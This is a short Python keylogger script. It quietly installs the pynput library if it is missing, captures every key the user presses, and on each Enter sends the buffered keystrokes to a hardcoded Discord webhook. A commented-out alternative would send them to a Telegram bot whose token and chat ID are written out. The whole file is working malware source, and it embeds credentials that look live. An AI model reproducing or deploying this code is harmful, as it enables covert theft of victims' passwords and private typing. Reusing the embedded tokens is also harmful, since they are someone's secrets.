import os
try:
    from pynput import keyboard
except:
    os.system("pip install pynput")
import requests



while True:





    webhook = 'https://discord.com/api/webhooks/883468057652129822/LYwL34ajf-B583wRDfn-QVCX4EDqFMyTk3OeFnOdioNVa6NLVAM_pz_Cijh7gWbbfe1f'
    # HttpDebug = "https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx"
    # TokenBot = "1760851666:AAE7erVKdFpAOl53MUsQgAl9gHIF4bjOCqU"
    # ChatId ="91067933"
    list = []

 



    def convert(list):
        send = ''.join(map(str,list))
        sens2 =send.replace("'","")
        return(sens2.replace('"',''))





    def on_press(key):
        pass


    def on_release(key):
        if key == keyboard.Key.enter:
            a = convert(list)
            # url = ("https://api.telegram.org/bot{a}/SendMessage?chat_id={b}&text={c}".format(a=TokenBot,b=ChatId,c=a))
            # Payloads = {
            #     "UrlBox": url,
            #     "AgentList": "MOzilla Firefox",
            #     "VersionsList": "HTTP/1.1",
            #     "MethodList": "POST"
            # }
            data2= {"username": "Bot", "content": a}

            resp = requests.post(webhook, json=data2).text
            list.clear()
            
        else:
            list.append(key)
        
    
 


    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
    listener()



